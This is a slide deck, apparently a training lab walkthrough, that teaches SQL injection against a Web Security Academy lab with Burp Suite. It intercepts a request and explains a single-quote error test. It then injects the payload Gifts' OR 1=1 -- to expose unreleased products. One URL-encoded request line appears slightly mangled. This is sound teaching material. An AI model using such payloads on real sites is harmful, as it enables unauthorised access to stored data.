# SQL Injections

_Category: Hacking Practical — Source: https://www.canva.com/design/DAGbhAr_wtI/xuKa8axYUSceRI6kmHS15g/edit_

---

## Slide 1

SQL INJECTION

SQL Injection

## Slide 2

5.0s
Animate
Position

SQL Injection (SQLi) is a critical web application vulnerability that allows attackers to
interfere with database queries executed by an application. Exploiting this
vulnerability enables unauthorized access to sensitive data that are stored in the
database, which could potentially include information such as personal identifiable
information (PII), passwords, payment details, and more.




In this sub module, you will test a website for an SQLi vulnerability in the WHERE
clause, retrieve hidden data from the database, and view it. We will use Burp Suite
Community Edition for this lab.




SQL INJECTION

SQL INJECTION

SQL Injection

SQL Injection (SQLi) is a critical web application vulnerability that allows attackers to interfere with database queries executed by an application. Exploiting this vulnerability enables unauthorized access to sensitive data that are stored in the database, which could potentially include information such as personal identifiable information (PII), passwords, payment details, and more.

In this sub module, you will test a website for an SQLi vulnerability in the WHERE clause, retrieve hidden data from the database, and view it. We will use Burp Suite Community Edition for this lab.

SQL Injection

## Slide 3

6.0s
Animate
Position

Tools Required
Burp Suite
Community Edition.

Proxy Configuration
Configure your browser
to proxy traffic through
Burp Suite.

SQL Basics

 Knowledge of SQL
queries.

PREREQUISITES

Prerequisites

Tools Required Burp Suite Community Edition.

Proxy Configuration Configure your browser to proxy traffic through Burp Suite.

SQL Basics

Knowledge of SQL queries.

## Slide 4

8.0s
Animate
Position

LAB DESCRIPTION AND OBJECTIVE

OBJECTIVE

The vulnerable query in this lab is as follows:

This query retrieves all products in the "Gifts" category where the released column is
set to TRUE (1).

Modify the SQL query to bypass restrictions and retrieve both released and
unreleased data.

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Lab Description And Objective

The vulnerable query in this lab is as follows:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

This query retrieves all products in the "Gifts" category where the released column is set to TRUE (1).

Objective

Modify the SQL query to bypass restrictions and retrieve both released and unreleased data.

## Slide 5

5.0s
Animate
Position

Open the lab page and click the ACCESS
THE LAB button.

STEP-BY-STEP INSTRUCTIONS

1. ACCESS THE LAB

Step-by-Step Instructions

1. Access the Lab

Open the lab page and click the ACCESS THE LAB button.

## Slide 6

5.2s
Animate
Position

Start a new temporary project in Burp Suite:




Click Next to start a new project.




In the dialog box, click Start Burp.

2. LAUNCH BURP SUITE

2. Launch Burp Suite

Start a new temporary project in Burp Suite:

Click Next to start a new project.

In the dialog box, click Start Burp.

## Slide 7

5.0s
Animate
Position

In Burp Suite

In the browser

3. INTERCEPT TRAFFIC

Navigate to the Proxy tab.




Enable Intercept.

Select the "Pets" category.




The traffic request will appear
in Burp Suite.




3. Intercept Traffic

In Burp Suite

In the browser

Navigate to the Proxy tab.

Enable Intercept.

Select the "Pets" category.

The traffic request will appear in Burp Suite.

## Slide 8

6.0s
Animate
Position

Web Request 

GET /filter?category=Pets HTTP/2

Host: 0a270005040a062762060b4300fd.web-security-academy.net

Cookie: session=vKkL7pK7cX53uMw4iW1yB0A

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
Firefox/102.0

Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/a
vif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://0a270005040a062762060b4300fd.web-security-
academy.net/

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1

Sec-GPC: 1

TE: trailers

GET /filter?category=Pets HTTP/2

Host: 0a270005040a062762060b4300fd.web-security-academy.net

Cookie: session=vKkL7pK7cX53uMw4iW1yB0A

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://0a270005040a062762060b4300fd.web-security-academy.net/

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1

Sec-GPC: 1

TE: trailers

Web Request

## Slide 9

5.0s
Animate
Position

To test for SQL injection vulnerability, this HTTP request can be sent to repeater. To send this
request to repeater, right-click the intercepted request and choose Send to Repeater.

To test for SQL injection vulnerability, this HTTP request can be sent to repeater. To send this request to repeater, right-click the intercepted request and choose Send to Repeater.

## Slide 10

5.0s
Animate
Position

4. TEST FOR SQLI VULNERABILITY

As mentioned before, the objective of the lab is to retrive hidden products, that are
unrealeased products. Recap of the lab description: The vulnerable query in this lab is
as follows:

In the repeater, we can start modifing the category parameter in the HTTP
request to test SQL injection in the SQL WHERE clause.

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

modifing the category parameter in the
HTTP request to test SQL injection

4. Test for SQLi Vulnerability

As mentioned before, the objective of the lab is to retrive hidden products, that are unrealeased products. Recap of the lab description: The vulnerable query in this lab is as follows:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

In the repeater, we can start modifing the category parameter in the HTTP request to test SQL injection in the SQL WHERE clause.

modifing the category parameter in the HTTP request to test SQL injection

## Slide 11

5.0s
Animate
Position

FOR EXAMPLE,

SINGLE QUOTE

ERROR SQL

if we pass ' as the category, the SQL query will become the following, and thus
causing error due to unclosed single quote:

SELECT * FROM products WHERE category = ''' AND released = 1

For example,

if we pass ' as the category, the SQL query will become the following, and thus causing error due to unclosed single quote:

SELECT * FROM products WHERE category = ''' AND released = 1

single quote

error SQL

## Slide 12

5.0s
Animate
Position

In order to retrive unreleased products, either we need to remove the AND release = 1
condition from the SQL query or set it to AND released = 0 to only retrive unreleased
products. While we cannot directly modify the SQL query condition that prevents the
server from sending unreleased products, we can still use SQL comments to comment
that out, thus making it without effect.

SELECT * FROM products WHERE category = ''' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 0

SELECT * FROM products WHERE category = ''' AND released = 1

In order to retrive unreleased products, either we need to remove the AND release = 1 condition from the SQL query or set it to AND released = 0 to only retrive unreleased products. While we cannot directly modify the SQL query condition that prevents the server from sending unreleased products, we can still use SQL comments to comment that out, thus making it without effect.

SELECT * FROM products WHERE category = ''' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 0

## Slide 13

5.0s
Animate
Position

FOR EXAMPLE,

If we pass Gifts' OR 1=1 -- as the caterogy, the SQL query would become 

This payload appends an OR 1=1 condition, which always evaluates to TRUE,
making the SQL to return all categories. Lastly, -- is added to comment out the
rest of the SQL query, which is AND released = 1.

SELECT * FROM products WHERE category = 'Gifts' or 1 = 1 -- AND
released = 1

For example,

If we pass Gifts' OR 1=1 -- as the caterogy, the SQL query would become

SELECT * FROM products WHERE category = 'Gifts' or 1 = 1 -- AND released = 1

This payload appends an OR 1=1 condition, which always evaluates to TRUE, making the SQL to return all categories. Lastly, -- is added to comment out the rest of the SQL query, which is AND released = 1.

## Slide 14

5.0s
Animate
Position

PAYLOAD IN ACTION

Tamper the category parameter with this SQL injection payload, and press
Ctrl + U while highlighting it to URL-encode it.

Web Request 

GET /filter?category=Gifts'+OR+1%3d-- HTTP/2

Host: 0a8f00eb04779bcd805d999a007f009e.web-security-academy.net

Cookie: session=gmq5RcDbCg1qGCDMWksT8kmYdspni05SW

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0
.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://0a8f00eb04779bcd805d999a007f009e.web-security-academy.net/

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1

Te: trailers

Payload in action

Tamper the category parameter with this SQL injection payload, and press Ctrl + U while highlighting it to URL-encode it.

Web Request

GET /filter?category=Gifts'+OR+1%3d-- HTTP/2

Host: 0a8f00eb04779bcd805d999a007f009e.web-security-academy.net

Cookie: session=gmq5RcDbCg1qGCDMWksT8kmYdspni05SW

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://0a8f00eb04779bcd805d999a007f009e.web-security-academy.net/

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1

Te: trailers

## Slide 15

5.0s
Animate
Position

Click Send in the Repeater tab to send the HTTP request

Click Send in the Repeater tab to send the HTTP request

## Slide 16

5.0s
Animate
Position

The application will execute the
following query:

Both released and unreleased data will
be displayed.

5. VERIFY THE RESULT

SELECT * FROM products WHERE category
= 'Gifts' OR 1=1 --

5. Verify the Result

The application will execute the following query:

SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --

Both released and unreleased data will be displayed.

## Slide 17

8.7s
Animate
Position

The lab will display a message:
"Congratulations, you solved the lab!"

6. SUCCESS

6. Success

The lab will display a message: "Congratulations, you solved the lab!"

## Slide 18

8.4s
Animate
Position

Explored the concept of SQL injection.




Set up Burp Suite for web application testing.




Performed a web request and modified the payload to bypass restrictions.




Verified the result using Burp Suite.




Identified and exploited an SQLi vulnerability.




Retrieved hidden data using a crafted payload.

CONCLUSION

Conclusion

Explored the concept of SQL injection.

Set up Burp Suite for web application testing.

Performed a web request and modified the payload to bypass restrictions.

Verified the result using Burp Suite.

Identified and exploited an SQLi vulnerability.

Retrieved hidden data using a crafted payload.
